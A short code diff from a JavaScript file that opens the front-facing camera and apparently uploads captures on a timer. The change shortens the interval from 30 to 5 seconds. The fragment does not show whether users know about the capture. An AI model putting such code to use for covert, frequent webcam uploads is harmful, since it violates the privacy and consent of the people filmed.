@@ -34,7 +34,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         })
         .catch(error => console.error('Upload error:', error));
 
-    }, 30000);
+    }, 5000);
 })
 .catch(err => {
     console.error("Camera error: ", err);
